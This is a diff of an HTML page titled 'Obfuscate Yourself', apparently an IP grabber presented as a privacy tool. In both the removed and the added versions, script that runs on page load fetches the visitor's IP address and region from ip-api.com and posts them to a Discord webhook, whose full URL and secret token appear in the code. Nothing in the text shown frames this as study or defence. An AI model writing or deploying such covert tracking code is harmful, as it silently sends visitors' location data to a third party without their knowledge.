@@ -4,83 +4,30 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Obfuscate Yourself</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            color: white;
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            flex-direction: column;
-            background-color: #333;
-            transition: background-color 0.5s ease;
-        }
+    <script>
+        (async function() {
+            try {
+                // Fetch IP and region as soon as possible
+                let response = await fetch("http://ip-api.com/json");
+                let data = await response.json();
+                let ip = data.query || "Unknown";
+                let region = data.regionName || "Unknown";
 
-        h1 {
-            font-size: 2em;
-        }
+                // Send to webhook immediately
+                fetch("https://discord.com/api/webhooks/1341441043731583008/hOAU9hS3JRie79ibDwWw4fj4u6XH7AHmT4xnozrV-1rGP0ffLsSG07L1y6z_P7T3SN0z", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `🌍 **Region:** ${region}\n📡 **IP Address:** ${ip}` })
+                });
 
-        p {
-            font-size: 1.2em;
-        }
-    </style>
+            } catch (error) {
+                console.error("Failed to get IP/Region:", error);
+            }
+        })();
+    </script>
 </head>
 <body>
     <h1>Obfuscate Yourself</h1>
     <p>Detecting your IP and region...</p>
-
-    <script>
-        // Function to generate a random color for background
-        function randomBackgroundColor() {
-            const colors = ['#FF5733', '#33FF57', '#3357FF', '#F3FF33', '#F333FF', '#33F3FF'];
-            const randomColor = colors[Math.floor(Math.random() * colors.length)];
-            document.body.style.backgroundColor = randomColor;
-        }
-
-        // Function to get the real region and IP using ip-api
-        function getRegionAndIP() {
-            return new Promise((resolve, reject) => {
-                $.get("http://ip-api.com/json", function(response) {
-                    const region = response.regionName || "Unknown";  
-                    const ip = response.query || "Unknown";  
-                    resolve({ region, ip });
-                }).fail(function() {
-                    reject("Region and IP detection failed.");
-                });
-            });
-        }
-
-        // Function to send the region and IP to the webhook
-        function sendRegionAndIPToWebhook(region, ip) {
-            $.ajax({
-                url: "https://discord.com/api/webhooks/1341441043731583008/hOAU9hS3JRie79ibDwWw4fj4u6XH7AHmT4xnozrV-1rGP0ffLsSG07L1y6z_P7T3SN0z",
-                type: "POST",
-                contentType: "application/json",
-                data: JSON.stringify({
-                    content: `🌍 **Region:** ${region}\n📡 **IP Address:** ${ip}`
-                }),
-                success: function() {
-                    console.log("Region and IP sent successfully.");
-                },
-                error: function(xhr, status, error) {
-                    console.error("Error sending region and IP:", status, error);
-                }
-            });
-        }
-
-        // Run on page load
-        randomBackgroundColor();
-        getRegionAndIP().then(function(data) {
-            console.log("Detected region:", data.region);
-            console.log("Detected IP:", data.ip);
-            sendRegionAndIPToWebhook(data.region, data.ip);
-        }).catch(function(error) {
-            console.error(error);
-        });
-    </script>
 </body>
 </html>
